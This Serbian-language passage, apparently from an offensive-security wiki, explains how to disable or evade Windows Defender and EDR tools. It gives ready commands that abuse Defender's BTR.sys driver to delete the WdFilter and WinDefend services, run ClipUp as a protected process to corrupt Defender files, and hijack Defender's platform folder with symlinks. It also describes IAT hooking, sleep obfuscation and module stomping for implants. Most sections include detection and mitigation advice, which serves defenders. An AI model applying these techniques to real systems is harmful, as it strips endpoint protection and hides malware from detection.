Microsoft Defender-ov drajver **Boot-Time Removal** predstavlja koristan kontraprimer klasičnom BYOVD-u. `BTR.sys` je legitimna Microsoft-om potpisana komponenta za sanaciju, bez greške koja omogućava oštećenje memorije i bez IOCTL interfejsa; nakon sticanja administratorskog pristupa i privilegije `SeLoadDriverPrivilege`, operater može umesto toga da falsifikuje njegovu privatnu transakciju sanacije i dobije predviđene operacije nad datotekama i registrima u Ring-0 režimu. Ovo je **primitiva za neutralizaciju AV/EDR-a nakon kompromitovanja, a ne za početni pristup ili eskalaciju privilegija**, a drajver se može izdvojiti iz resursa `BOOTTIMETOOL` u ciljnom `MpEngine.dll`, umesto da se uveze upadljiv drajver treće strane.<sup>[[36]](#references)</sup>

### Priprema jednokratnog drajvera

Defender obično izbacuje resurs kao datoteku nasumičnog naziva `[a-z]{8}.sys` i registruje kernel servis sa sličnim nazivom. `DriverEntry` čita vrednost `Args` servisa, otvara referencirani NTFS ADS, dešifruje i proverava listu radnji, zapisuje povратne informacije i vraća `0xC0000056` (`STATUS_DELETE_PENDING`) nakon uspešnog izvršenja, čime se drajver učitava из меморије уместо да остане резидентан. Фалсификовани сервис има следеће карактеристичне вредности.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Tok `:changelist` sadrži jedan blob šifrovan RC4 algoritmom. Analizirane verzije ponovo koriste fiksni ključ od 256 bajtova, pa šifrovanje ne predstavlja granicu autorizacije. Ispravan otvoreni tekst ima globalno zaglavlje od 24 bajta (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC zaglavlja i ID transakcije izveden iz sadržaja), iza kojeg slede putanja do feedback datoteke, završena nulom, kodirana UTF-16 formatom, i proizvoljan broj stavki. Svaka stavka ima zaglavlje od 16 bajtova (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) i podatke specifične za akciju, koji se završavaju sa **tačno četiri NUL bajta**. Svaki region zaglavlja/podataka proverava se zasebno pomoću CRC-32 polinoma `0xEDB88320`, početnog stanja `0xFFFFFFFF` i **bez završnog XOR-a** (`~CRC32`); CRC stanje se resetuje za svaki region.<sup>[[36]](#references)[[37]](#references)</sup>

Prihvaćeni ID-jevi akcija izlažu sledeće primitive kernela.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Podaci stavke | Rezultat |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Briše datoteku, uključujući zaključanu datoteku |
| 2 | `[UTF-16 path]` | Uklanja prazan direktorijum |
| 3 | `[Flags][source][destination]` | Premešta datoteku na zaštićenu putanju koju je izabrao napadač; prazno odredište znači brisanje |
| 4 | `[Flags][key path]` | Rekurzivno briše registry ključ |
| 5 | `[Flags][key path + "\\" + value]` | Briše registry vrednost |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Kreira/ažurira registry vrednost i kreira putanje do nedostajućih ključeva |

Kod akcija 5 i 6, separator ključa/vrednosti u zapisu je **dve uzastopne obrnute kose crte**; putanja formatirana na uobičajen način neće biti ispravno podeljena. Feedback datoteka uglavnom preslikava zahtev, ali prva četiri bajta podataka svake stavke postaju njen rezultujući `NTSTATUS`. Kod akcija 1 i 2, koje nemaju početno polje zastavica, BTR pomera putanju u četiri rezervisana završna bajta da bi oslobodio prostor za taj status.<sup>[[36]](#references)</sup>

### Tok rada `BTR_CLI` i vremenski prozor pri ranom pokretanju

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) sprovodi ceo lanac: izdvaja `BTR.sys` iz lokalnog Defendera, kreira `<random>.sys:changelist` i feedback stream, serijalizuje/izračunava kontrolne sume/šifruje ulančane akcije, direktno kreira service registry ključ, a zatim poziva `NtLoadDriver` za `-trigger now` ili ga ostavlja kao drajver koji se pokreće pri pokretanju sistema za `-trigger boot`. Direktno postavljanje u registry izbegava uobičajeni SCM put `CreateServiceW` i zato **ne generiše događaj instalacije servisa, ID 7045**. Artefakti pokrenuti pri podizanju sistema mogu se naknadno ukloniti pomoću `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` nije upotrebljiv jer BTR obavlja I/O nad datotekama iz `DriverEntry` pre nego što storage stack i veza `SystemRoot` postanu spremni. `Start=1` uz grupu visokog prioriteta `Boot Bus Extender` umesto toga izvršava se u Phase 1: NTFS je upotrebljiv, ali mnogi system-start security driver-i i user-mode EDR servisi još nisu inicijalizovani. Boot-start filteri kao što je `WdFilter` možda su već učitani, ali BTR može da ukloni njihove binarne datoteke ili konfiguraciju servisa pre sledećeg pokretanja, kao i da obriše izvršne datoteke servisa pre nego što ih SCM pokrene. ELAM ne zatvara ovaj jaz jer se BTR pokreće nakon boot-start evaluacije i ima važeći Microsoft potpis.<sup>[[36]](#references)</sup>

Više radnji se izvršava u jednoj transakciji. PoC dodaje Action 1 na početak za hardkodiranu putanju `\SystemRoot\Temp\BootClean.log`: BTR kreira ovaj log, zatim obrađuje sopstveni zahtev za brisanje i uklanja ga pre isključivanja. Time se smanjuje količina dokaza, dok smeštanje povratnih informacija u `<random>.sys:<random>.dat` omogućava zajedničko uklanjanje driver-a i oba stream-a.<sup>[[36]](#references)[[37]](#references)</sup>

### Korelacije za detekciju sa visokim signalom

Pravila zasnovana samo na potpisu i Microsoft lista blokiranih ranjivih driver-a ne sprečavaju zloupotrebu predviđene BTR funkcionalnosti. Prednost dajte sledećim korelacijama ponašanja, uz razlikovanje legitimnog Defender porekla od proizvoljnog pokretača.<sup>[[36]](#references)</sup>

- **Sysmon 15:** kreiranje `.sys:changelist` univerzalno je za BTR staging. ADS `.dat` pridružen istoj `.sys` datoteci posebno je sumnjiv jer legitimni Defender obično smešta povratne informacije u `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 bez System 7045:** korelišite direktno kreiranje `HKLM\SYSTEM\CurrentControlSet\Services\<random>` koje sadrži `Args=...:changelist` i `Group=Boot Bus Extender`, a nema odgovarajući SCM instalacioni događaj.
- **Sysmon 6 -> 23:** korelišiše učitavanje poznatog BTR driver-a koji nije pokrenut kroz Defender, sa naknadnim brisanjem datoteke koje se pripisuje procesu `System`/PID 4, naročito kada su u pitanju bezbednosne binarne datoteke.
- **Sysmon 11 -> 23:** upozoravajte na brzo kreiranje i brisanje datoteke `\SystemRoot\Temp\BootClean.log` od strane procesa `System`/PID 4.
- Ograničite i nadgledajte dodeljivanje/omogućavanje privilegije `SeLoadDriverPrivilege`; sam Microsoft potpis nije dovoljan razlog za poverenje kada bezbednosni alat priprema driver preko `cmd.exe`, PowerShell-a ili nepoznatog procesa.

## Zloupotreba Protected Process Light (PPL) za izmenu AV/EDR-a pomoću LOLBIN-ova

Protected Process Light (PPL) sprovodi hijerarhiju signer/level, tako da samo zaštićeni procesi istog ili višeg nivoa mogu da menjaju jedni druge. Iz ofanzivne perspektive, ako možete legitimno da pokrenete PPL-om omogućenu binarnu datoteku i kontrolišete njene argumente, možete da iskoristite benignu funkcionalnost (npr. logging) kao ograničeni write primitive, zaštićen PPL-om, za upisivanje u zaštićene direktorijume koje koriste AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Šta je potrebno da bi se proces pokrenuo kao PPL
- Ciljni EXE (i sve učitane DLL datoteke) mora biti potpisan EKU-om koji podržava PPL.
- Proces mora biti kreiran pomoću CreateProcess uz zastavice: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Potrebno je zatražiti kompatibilan protection level koji odgovara signer-u binarne datoteke (npr. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` za anti-malware signer-e, `PROTECTION_LEVEL_WINDOWS` za Windows signer-e). Pogrešni nivoi dovešće do neuspešnog kreiranja.

Pogledajte i širi uvod u PP/PPL i LSASS zaštitu ovde:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Alati za pokretanje
- Open-source pomoćni alat: CreateProcessAsPPL (bira protection level i prosleđuje argumente ciljnom EXE-u):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Obrazac korišćenja:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- Potpisani sistemski binarni fajl `C:\Windows\System32\ClipUp.exe` pokreće sopstveni proces i prihvata parametar za upisivanje log fajla na putanju koju zadaje pozivalac.
- Kada se pokrene kao PPL proces, upisivanje fajla se obavlja uz zaštitu PPL-a.
- ClipUp ne može da parsira putanje koje sadrže razmake; koristite kratke 8.3 putanje za pristup uobičajeno zaštićenim lokacijama.

Pomoćni alati za kratke 8.3 putanje
- Prikaz kratkih imena: `dir /x` u svakom nadređenom direktorijumu.
- Izvođenje kratke putanje u cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Lanac zloupotrebe (apstraktan)
1) Pokrenite PPL-capable LOLBIN (ClipUp) sa `CREATE_PROTECTED_PROCESS` pomoću pokretača (npr. CreateProcessAsPPL).
2) Prosledite ClipUp argument za putanju log fajla da biste izazvali kreiranje fajla u zaštićenom AV direktorijumu (npr. Defender Platform). Po potrebi koristite kratka 8.3 imena.
3) Ako AV obično drži ciljnu binarnu datoteku otvorenom/zaključanom dok radi (npr. MsMpEng.exe), zakažite upisivanje pri pokretanju sistema, pre nego što se AV pokrene, tako što ćete instalirati automatski pokrenutu uslugu koja se pouzdano pokreće ranije. Proverite redosled pokretanja pomoću Process Monitor-a (boot logging).
4) Nakon ponovnog pokretanja, upisivanje uz zaštitu PPL-a obavlja se pre nego što AV zaključa svoje binarne datoteke, oštećujući ciljnu datoteku i sprečavajući pokretanje.

Primer poziva (putanje su uklonjene/skraćene iz bezbednosnih razloga):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Napomene i ograničenja
- Ne možete da kontrolišete sadržaj koji ClipUp upisuje, već samo lokaciju; ova primitivna tehnika pogodna je za oštećivanje, a ne za precizno ubacivanje sadržaja.
- Potrebne su lokalne administratorske/SYSTEM privilegije za instaliranje/pokretanje usluge i prilika za ponovno pokretanje.
- Vreme je presudno: cilj ne sme biti otvoren; izvršavanje pri pokretanju sistema izbegava zaključavanje datoteka.

Detekcije
- Kreiranje procesa `ClipUp.exe` sa neuobičajenim argumentima, naročito kada ga pokreću nestandardni programi, u vreme pokretanja sistema.
- Nove usluge podešene za automatsko pokretanje sumnjivih binarnih datoteka koje se dosledno pokreću pre Defender/AV-a. Istražite kreiranje/izmenu usluga pre neuspeha pri pokretanju Defender-a.
- Praćenje integriteta datoteka Defender binarnih datoteka/direktorijuma Platform; neočekivano kreiranje/izmena datoteka od strane procesa sa zastavicama za zaštićene procese.
- ETW/EDR telemetrija: tražite procese kreirane sa `CREATE_PROTECTED_PROCESS` i anomalnu upotrebu PPL nivoa od strane binarnih datoteka koje nisu AV.

Ublažavanje
- WDAC/Code Integrity: ograničite koje potpisane binarne datoteke mogu da se pokreću kao PPL i pod kojim nadređenim procesima; blokirajte pozivanje ClipUp-a van legitimnog konteksta.
- Higijena usluga: ograničite kreiranje/izmenu usluga koje se automatski pokreću i nadgledajte manipulisanje redosledom pokretanja.
- Obezbedite da su zaštita od neovlašćenih izmena Defender-a i zaštite pri ranom pokretanju omogućene; istražite greške pri pokretanju koje ukazuju na oštećenje binarnih datoteka.
- Razmotrite onemogućavanje generisanja kratkih imena 8.3 na diskovima koji sadrže bezbednosne alate, ako je to kompatibilno s vašim okruženjem (temeljno testirajte).

## Menjanje Microsoft Defender-a putem otmice simboličke veze fascikle Platform Version

Windows Defender bira platformu sa koje se pokreće nabrajanjem podfascikli u:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Izabere podfasciklu s najvišim leksikografskim nizom verzije (npr. `4.18.25070.5-0`), a zatim odatle pokreće procese usluge Defender (uz ažuriranje putanja usluga/registra). Ovaj izbor se oslanja na unose direktorijuma, uključujući tačke za ponovno raščlanjivanje direktorijuma (simboličke veze). Administrator može to da iskoristi za preusmeravanje Defender-a na putanju u koju napadač može da upisuje i tako postigne DLL sideloading ili ometanje usluge.<sup>[[21]](#references)[[22]](#references)</sup>

Preduslovi
- Lokalni administrator (potreban za kreiranje direktorijuma/simboličkih veza u fascikli Platform)
- Mogućnost ponovnog pokretanja sistema ili pokretanja ponovnog izbora Defender platforme (ponovno pokretanje usluge pri podizanju sistema)
- Potrebni su samo ugrađeni alati (`mklink`)

Zašto funkcioniše
- Defender blokira upisivanje u sopstvene fascikle, ali se pri izboru platforme oslanja na unose direktorijuma i bira leksikografski najvišu verziju bez provere da li se cilj razrešava na zaštićenu/poverljivu putanju.

Koraci (primer)
1) Pripremite kopiju trenutne platforme u koju može da se upisuje, npr. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Kreirajte direktorijumski symlink sa višom verzijom unutar Platform koji upućuje na vaš folder:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Izbor okidača (preporučuje se ponovno pokretanje):
```cmd
shutdown /r /t 0
```
4) Proverite da li se MsMpEng.exe (WinDefend) pokreće sa preusmerene putanje:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Trebalo bi da uočite novu putanju procesa ispod `C:\TMP\AV\` i da konfiguracija servisa/registar odražavaju tu lokaciju.

Opcije nakon eksploatacije
- DLL sideloading/code execution: Ubacite/zamenite DLL-ove koje Defender učitava iz direktorijuma aplikacije da biste izvršili kod u Defender procesima. Pogledajte gornji odeljak: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Uklonite version-symlink kako se konfigurisana putanja ne bi razrešila pri sledećem pokretanju, zbog čega Defender neće uspeti da se pokrene:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Imajte na umu da ova tehnika sama po sebi ne omogućava eskalaciju privilegija; potrebna su administratorska prava.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teamovi mogu da premeste runtime evasion iz C2 implanta u sam ciljni modul tako što će zakačiti njegovu Import Address Table (IAT) i usmeriti odabrane API-je kroz napadačev position-independent code (PIC). Time se evasion proširuje izvan malog skupa API-ja koje mnogi kitovi izlažu (npr. CreateProcessA), a iste zaštite primenjuju se i na BOF-ove i post-exploitation DLL-ove.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Pristup na visokom nivou
- Pripremite PIC blob uz ciljni modul pomoću reflective loader-a (dodat na početak ili kao prateća datoteka). PIC mora biti samostalan i position-independent.
- Kada se host DLL učita, prođite kroz njegov IMAGE_IMPORT_DESCRIPTOR i zakrpite IAT unose za ciljane importe (npr. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) tako da pokazuju na tanke PIC wrappers.
- Svaki PIC wrapper izvršava evasion tehnike pre tail-call-a ka adresi pravog API-ja. Uobičajene tehnike uključuju:
  - Maskiranje/uklanjanje maske memorije oko poziva (npr. šifrovanje beacon regiona, RWX→RX, menjanje naziva/ovlašćenja stranica), pa vraćanje stanja nakon poziva.
  - Call-stack spoofing: napravite benigni stek i pređite na ciljni API tako da analiza call stack-a prikaže očekivane frejmove.<sup>[[9]](#references)</sup>
- Radi kompatibilnosti, izvezite interfejs koji omogućava Aggressor skripti (ili ekvivalentu) da registruje API-je koje treba zakačiti za Beacon, BOF-ove i post-ex DLL-ove.

Zašto ovde koristiti IAT hooking
- Radi za svaki kod koji koristi zakačeni import, bez izmene koda alata i bez oslanjanja na Beacon da posreduje pri pozivima određenih API-ja.
- Obuhvata post-ex DLL-ove: zakačivanje LoadLibrary* omogućava presretanje učitavanja modula (npr. System.Management.Automation.dll, clr.dll) i primenu istog maskiranja/stack evasion-a na njihove API pozive.
- Vraća pouzdano korišćenje post-ex komandi koje pokreću procese u okruženjima sa detekcijom zasnovanom na call stack-u, omotavanjem CreateProcessA/W poziva.

Minimalni nacrt IAT hook-a (pseudokod za x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Napomene
- Primeni patch nakon relocations/ASLR-a, a pre prve upotrebe importa. Reflective loader-i kao što su TitanLdr/AceLdr demonstriraju hooking tokom DllMain-a učitanog modula.
- Wrapper-i neka budu mali i PIC-safe; pravu API funkciju razreši pomoću originalne IAT vrednosti koju si sačuvao pre patchovanja ili preko LdrGetProcedureAddress.
- Za PIC koristi RW → RX prelaze i izbegavaj stranice koje su istovremeno writable i executable.

Call-stack spoofing stub
- PIC stub-ovi u Draugr stilu prave lažni call chain (povratne adrese unutar benignih modula), a zatim prelaze na pravu API funkciju.
- Ovo zaobilazi detekcije koje očekuju kanonske stack-ove od Beacon/BOF-ova do osetljivih API-ja.
- Kombinuj sa tehnikama stack cutting/stack stitching da bi stigao do očekivanih frejmova pre prologa API funkcije.

Operativna integracija
- Postavi reflective loader ispred post-ex DLL-ova kako bi se PIC i hooks automatski inicijalizovali pri učitavanju DLL-a.
- Koristi Aggressor skriptu za registraciju ciljnih API-ja kako bi Beacon i BOF-ovi transparentno koristili isti put za evaziju, bez izmena koda.

Razmatranja za detekciju/DFIR
- Integritet IAT-a: unosi koji vode do adresa van image-a (heap/anon); periodična provera import pointer-a.
- Anomalije stack-a: povratne adrese koje ne pripadaju učitanim image-ovima; nagli prelazi na PIC van image-a; nedosledno poreklo RtlUserThreadStart-a.
- Telemetrija loader-a: upisivanje u IAT unutar procesa, rana DllMain aktivnost koja menja import thunk-ove, neočekivani RX region-i nastali pri učitavanju.
- Izbegavanje image-load detekcije: ako se hook-uje LoadLibrary*, nadgledaj sumnjiva učitavanja automation/clr assembly-ja povezana sa događajima maskiranja memorije.

Povezani gradivni elementi i primeri
- Reflective loader-i koji obavljaju IAT patching tokom učitavanja (npr. TitanLdr, AceLdr)
- Memory masking hooks (npr. simplehook) i stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stub-ovi (npr. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks preko rezidentnog PICO-a

Ako kontrolišeš reflective loader, možeš da hook-uješ importe **tokom** `ProcessImports()` tako što ćeš pokazivač `GetProcAddress` loader-a zameniti prilagođenim resolver-om koji prvo proverava hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Napravi **rezidentni PICO** (persistent PIC object) koji opstaje nakon što se privremeni loader PIC oslobodi.
- Izvezi funkciju `setup_hooks()` koja prepisuje import resolver loader-a (npr. `funcs.GetProcAddress = _GetProcAddress`).
- U `_GetProcAddress` preskoči ordinal importe i koristi hash-based pretragu hook-ova, poput `__resolve_hook(ror13hash(name))`. Ako hook postoji, vrati ga; u suprotnom prosledi poziv pravom `GetProcAddress`.
- Registruj ciljeve hook-ova u vreme linkovanja pomoću Crystal Palace unosa `addhook "MODULE$Func" "hook"`. Hook ostaje važeći jer se nalazi unutar rezidentnog PICO-a.

Time se postiže **import-time IAT redirekcija** bez patchovanja code section-a učitanog DLL-a nakon učitavanja.

### Forsiranje hookable importa kada cilj koristi PEB-walking

Import-time hooks se aktiviraju samo ako se funkcija zaista nalazi u IAT-u cilja. Ako modul razrešava API-je preko PEB-walk-a i hash-a (bez import unosa), forsiraj pravi import kako bi loader-ov put `ProcessImports()` mogao da ga obradi:

- Zameni hashed export resolution (npr. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) direktnom referencom, kao što je `&WaitForSingleObject`.
- Kompajler će generisati IAT unos, što omogućava presretanje pri razrešavanju importa u reflective loader-u.

### Ekko-style sleep/idle obfuscation bez patchovanja `Sleep()`

Umesto patchovanja `Sleep`, hook-uj **stvarne wait/IPC primitive** koje implant koristi (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Za duga čekanja, obavij poziv Ekko-style obfuscation chain-om koji šifruje image u memoriji tokom mirovanja:<sup>[[31]](#references)[[27]](#references)</sup>

- Koristi `CreateTimerQueueTimer` da zakažeš niz callback-ova koji pozivaju `NtContinue` sa pripremljenim `CONTEXT` frejmovima.
- Uobičajen chain (x64): postavi image na `PAGE_READWRITE` → šifruj RC4 algoritmom preko `advapi32!SystemFunction032` ceo mapirani image → izvrši blokirajuće čekanje → dešifruj RC4 algoritmom → **vrati dozvole za svaki section pojedinačno** prolaskom kroz PE section-e → signaliziraj završetak.
- `RtlCaptureContext` obezbeđuje šablon `CONTEXT`; kloniraj ga u više frejmova i postavi registre (`Rip/Rcx/Rdx/R8/R9`) tako da pozivaju svaki korak.

Operativni detalj: za duga čekanja vrati „success“ (npr. `WAIT_OBJECT_0`) kako bi pozivalac nastavio dok je image maskiran. Ovaj obrazac skriva modul od skenera tokom perioda mirovanja i izbegava klasični potpis „patched `Sleep()`“.

Ideje za detekciju (zasnovane na telemetriji)
- Nalet callback-ova `CreateTimerQueueTimer` koji pokazuju na `NtContinue`.
- Upotreba `advapi32!SystemFunction032` nad velikim, neprekinutim baferima veličine image-a.
- `VirtualProtect` za veliki opseg, praćen vraćanjem prilagođenih dozvola za svaki section.

### Runtime CFG registracija za sleep-obfuscation gadget-e

Na CFG-om omogućenim ciljevima, prvi indirektni skok na mid-function gadget, kao što su `jmp [rbx]` ili `jmp rdi`, obično će srušiti proces sa `STATUS_STACK_BUFFER_OVERRUN`, jer gadget nije prisutan u CFG metapodacima modula. Da bi Ekko/Kraken-style chain-ovi radili u ojačanim procesima:<sup>[[30]](#references)</sup>

- Registruj svako indirektno odredište koje chain koristi pomoću `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` i unosa `CFG_CALL_TARGET_VALID`.
- Za adrese unutar učitanih image-ova (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` mora da počinje od **image base-a** i da obuhvati **punu veličinu image-a**.
- Za ručno mapirane/PIC/stomped region-e koristi **allocation base** i veličinu alokacije.
- Označi ne samo dispatch gadget, već i export-e do kojih se dolazi indirektno (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscall-ovi), kao i sve izvršne section-e pod kontrolom napadača koji će postati indirektna odredišta.

Ovim se ROP/JOP-style sleep chain-ovi iz primitiva koji „rade samo u procesima bez CFG-a“ pretvaraju u ponovo upotrebljivu tehniku za `explorer.exe`, pregledače, `svchost.exe` i druge krajnje tačke kompajlirane sa `/guard:cf`.

### CET-safe stack spoofing za uspavane thread-ove

Potpuna zamena `CONTEXT`-a stvara mnogo šuma i može da izazove probleme na CET Shadow Stack sistemima, jer spoofed `Rip` i dalje mora da se poklapa sa hardverskim shadow stack-om. Bezbedniji obrazac za maskiranje tokom spavanja je:<sup>[[30]](#references)</sup>

- Izaberi drugi thread u istom procesu i pročitaj granice njegovog `NT_TIB` / TEB stack-a (`StackBase`, `StackLimit`) pomoću `NtQueryInformationThread`.
- Napravi rezervnu kopiju pravog TEB/TIB-a trenutnog thread-a.
- Uhvatiti pravi kontekst thread-a koji spava pomoću `GetThreadContext`.
- Kopiraj **samo** pravi `Rip` u spoof context, a spoofed `Rsp`/stack state ostavi nеpromenjen.
- Tokom perioda spavanja, kopiraj `NT_TIB` spoof thread-a u TEB trenutnog thread-a kako bi stack walker-i mogli da unwind-uju unutar legitimnog opsega stack-a.
- Po završetku čekanja vrati originalni TIB i thread context.

Tako se čuva instruction pointer usklađen sa CET-om, a EDR stack walker-i koji se oslanjaju na TEB stack metapodatke za proveru unwind-a bivaju zavarani.

### Alternativa zasnovana na APC-u: Kraken Mask

Ako je timer-queue dispatch previše prepoznatljiv po potpisu, isti niz sleep-encrypt-spoof-restore može da se izvrši iz suspendovanog pomoćnog thread-a pomoću queued APC-ova:<sup>[[27]](#references)</sup>

- Napravi pomoćni thread sa `NtTestAlert` kao entrypoint-om.
- Stavi pripremljene `CONTEXT` frejmove/APC-ove u red pomoću `NtQueueApcThread` i isprazni ih pomoću `NtAlertResumeThread`.
- Sačuvaj stanje chain-a na heap-u umesto na stack-u pomoćnog thread-a, da ne bi iscrpeo podrazumevani stack od 64 KB.
- Koristi `NtSignalAndWaitForSingleObject` da bi atomski signalizirao start event i blokirao se.
- Suspenduj glavni thread pre vraćanja TIB/context-a (`NtSuspendThread` → restore → `NtResumeThread`) da bi se smanjio vremenski prozor u kojem bi skener mogao da uhvati delimično vraćen stack.

Ovime se potpis `CreateTimerQueueTimer` + `NtContinue` zamenjuje potpisom helper-thread/APC, uz zadržavanje istih ciljeva RC4 maskiranja i stack spoofing-a.

Dodatne ideje za detekciju
- `NtSetInformationVirtualMemory` sa `VmCfgCallTargetInformation` neposredno pre spavanja, čekanja ili APC dispatch-a.
- `GetThreadContext`/`SetThreadContext` oko `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ili `ConnectNamedPipe`.
- `NtQueryInformationThread` praćen direktnim upisima u granice stack-a TEB/TIB-a trenutnog thread-a.
- `NtQueueApcThread`/`NtAlertResumeThread` chain-ovi koji indirektno stižu do `SystemFunction032`, `VirtualProtect` ili pomoćnih funkcija za vraćanje dozvola section-a.
- Ponovljena upotreba kratkih gadget potpisa kao što su `FF 23` (`jmp [rbx]`) ili `FF E7` (`jmp rdi`) kao dispatch pivot-i unutar potpisanih modula.


## Precision Module Stomping

Module stomping izvršava payload-e iz **`.text` section-a DLL-a koji je već mapiran unutar ciljnog procesa**, umesto da alocira očiglednu privatnu izvršnu memoriju ili učitava novi potrošni DLL. Cilj za prepisivanje treba da bude **učitan image podržan fajlom na disku** čiji code space može da primi payload bez oštećivanja code path-ova koji su i dalje potrebni procesu.<sup>[[1]](#references)[[2]](#references)</sup>

### Pouzdan izbor cilja

Naivni stomping nad uobičajenim modulima kao što su `uxtheme.dll` ili `comctl32.dll` nije pouzdan: DLL možda nije učitan u udaljenom procesu, a premali code region može da sruši proces. Pouzdaniji postupak je:

1. Nabroj module ciljnog procesa i zadrži **names-only include list** DLL-ova koji su već učitani.
2. Prvo napravi payload i zabeleži njegovu **tačnu veličinu u bajtovima**.
3. Skeniraj DLL-ove na disku i uporedi PE section **`.text` `Misc_VirtualSize`** sa veličinom payloada. Ovo je važnije od veličine fajla jer odražava veličinu izvršnog section-a **nakon mapiranja u memoriju**.
4. Parsiraj **Export Address Table (EAT)** i izaberi RVA izvezene funkcije kao početni offset za stomping.
5. Izračunaj **blast radius**: ako payload premaši granicu izabrane funkcije, prepisaće susedne export-e koji slede iza nje u memoriji.

Tipični recon/izbor pomoćni alati koji se koriste u praksi:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operativne napomene
- Dajte prednost DLL-ovima koji su **već učitani** u udaljenom procesu kako biste izbegli telemetriju koju stvaraju `LoadLibrary`/neočekivana učitavanja image-a.
- Dajte prednost exportima koje ciljna aplikacija retko izvršava; u suprotnom, normalni putevi izvršavanja mogu naići na izmenjene bajtove pre ili posle kreiranja threada.
- Za velike implant-e često je potrebno promeniti način ugrađivanja shellcode-a iz string literala u **byte-array/braced initializer** kako bi ceo bafer bio ispravno predstavljen u izvornom kodu injectora.

Ideje za detekciju
- Udaljeni upisi u **izvršne stranice podržane image-om** (`MEM_IMAGE`, `PAGE_EXECUTE*`) umesto u uobičajenije privatne RWX/RX alokacije.
- Tačke ulaza exporta čiji se bajtovi u memoriji više ne podudaraju sa odgovarajućim fajlom na disku.
- Udaljeni thread-ovi ili preusmeravanja konteksta koji počinju izvršavanje unutar exporta legitimnog DLL-a čiji su početni bajtovi nedavno izmenjeni.
- Sumnjivi nizovi poziva `VirtualProtect(Ex)` / `WriteProcessMemory` nad DLL `.text` stranicama, nakon kojih sledi kreiranje threada.

## Trovanje parametara procesa (P3)

